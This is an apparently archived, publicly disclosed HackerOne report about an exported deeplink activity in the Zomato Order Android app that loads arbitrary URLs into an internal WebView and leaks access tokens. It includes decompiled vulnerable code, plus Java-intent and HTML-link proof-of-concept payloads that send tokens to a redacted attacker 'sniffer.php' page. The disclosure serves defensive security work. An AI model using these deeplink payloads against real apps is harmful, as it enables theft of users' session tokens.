---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - vuln/xss
  - vuln/info-disclosure
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2021-09-23
submitted: 2019-04-09T01:46:13.333Z
bounty_usd: 750
votes: 114
cve: []
program: "[[programs/eternal|Eternal]]"
reporter: "shell_c0de"
source: "https://hackerone.com/reports/532225"
title: "[Zomato Order] Insecure deeplink leads to sensitive information disclosure"
---
# [Zomato Order] Insecure deeplink leads to sensitive information disclosure

> **Severity:** High | **Bounty:** 750 USD | **Votes:** 114 | **Program:** Eternal | **Disclosed:** 2021-09-23

- Report: [https://hackerone.com/reports/532225](https://hackerone.com/reports/532225)
- CWE: N/A
- Submitted: 2019-04-09T01:46:13.333Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello, i want to report the vulnerability found,
Since the following activity `com.application.zomato.activities.DeepLinkRouter` has `exported="true"` it can be exploited by another application.

###Application Information

Application: [Zomato Order - Food Delivery App](https://play.google.com/store/apps/details?id=com.application.zomato.ordering)
Package Name: `com.application.zomato.ordering`
Version: `5.6.4`
Version Status: Last
Vulnerable class: `com.application.zomato.activities.DeepLinkRouter`

###Vulnerability

Using a special intent, you can send the access tokens to a malicious site.
```java
Follow the code
public class com.application.zomato.activities.DeepLinkRouter extends BaseAppCompactActivity {
public void onCreate(Bundle arg4) {
        super.onCreate(arg4);
        this.setContentView(0x7F0B04D2);
 if((TextUtils.isEmpty(this.c)) && this.getIntent() != null && this.getIntent().getAction() != null && ("android.intent.action.VIEW".equals(this.getIntent().getAction()))) {
            this.c = this.getIntent().getData().toString();
        }
        this.e(this.c);// getting zomatodelivery://etc URL
//..
private void e(String arg11) {
v0 = Uri.parse(arg11);
            if(!"zomato".equals(v0.getScheme()) && !"zomatodelivery".equals(v0.getScheme())) {
                return;
            }
            v1 = v0.getHost();
 if("zloyaltywebview".equals(v1)) {
                            if(TextUtils.isEmpty(v0.getQueryParameter("url"))) {
                                goto label_1496;
                            }
                            if(v0.getQueryParameter("navigation_bar_type") != null) {
                                if(!v0.getQueryParameter("navigation_bar_type").equalsIgnoreCase("transparent")) {
                                }
                                else {
                                    this.a(v0);//without check host
                                    goto label_1496;
                                }
                            }

                            this.g(v0);//with check host
                            goto label_1496;
//..
   private void a(Uri arg4) {
        String v0 = arg4.getQueryParameter("header_title");
        String v4 = arg4.getQueryParameter("url") != null ? arg4.getQueryParameter("url") : "";
        this.a(new Intent[]{WebViewActivity.newIntent(((Context)this), v4, v0, false)});//loadUrl
    }
```
Host check missing.
###PoC:
Java PoC:
```java
  Intent intent = new Intent("android.intent.action.VIEW");
  intent.setData(Uri.parse("zomatodelivery://zloyaltywebview/?url=██████████sniffer.php&navigation_bar_type=transparent"));
  startActivity(intent);
```
Payload: ████████
███████

HTML PoC:
```html
<a href="zomatodelivery://zloyaltywebview/?url=████sniffer.php&navigation_bar_type=transparent">Send token Zomato</a>
```
████
Payload: █████████zomato.html

###Fix
Check the host before load to WebView, your regular check in CommonLib works fine.

## Impact

1) Leakage of access tokens to arbitrary sites
2) XSS/Ability of open arbitrary sites in your internal WebView

## Timeline

- **Report Filed**
- **2019-04-09** @biryani-is-lob: Hi, @shell_c0de

Thanks for your submission, we are looking into this. 

Thanks 
@ehsahil-zomato
- **Report Severity Updated**
- **Report Severity Updated**
- **Report Triaged**
- **2019-04-09** @shell_c0de: Hi @ehsahil-zomato ,

Where did I go wrong, why is the severity level medium?

Kind regards,
@shell_c0de
- **2019-04-09** @biryani-is-lob: Hi @shell_c0de, 

This is interesting find but since it requires user interaction it falls under medium severity. 

Also, recent changes reintroduced this bug, Internally team was aware of it, we will be fixing this up. 

The similar issue already disclosed: #328486

Thanks
@ehsahil-zomato
- **2019-04-09** @shell_c0de: @ehsahil-zomato ,

Understood, thanks for the explanation.

Kind regards,
@shell_c0de
- **Bounty Awarded**
- **2019-04-13** @shell_c0de: @ehsahil-zomato ,
Thanks!
- **2019-04-15** @shell_c0de: @ehsahil-zomato ,

Package Name: `com.application.zomato`
Version: `13.2.6`
Status: Fixed

Kind regards,
@shell_c0de
- **2019-04-16** @biryani-is-lob: Hi @shell_c0de

Thanks for confirming the fix proactively. We're making few more changes, will be releasing the newer version soon.

Thanks,
@ehsahil-zomato
- **Report Resolved**
- **2019-05-25** @shell_c0de: Hi @ehsahil-zomato ,

In which version was the bug fixed? Version 5.6.4 has not been fixed.

Kind regards,
@shell_c0de
- **2019-05-27** @prateek_0490-zomato: @shell_c0de - Our order app will be deprecated within a month, hence @ehsahil-zomato marked it as resolved.

Prateek
- **Agreed On Going Public**
- **Report Title Updated**
- **Changed Scope**
- **Report Severity Updated**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
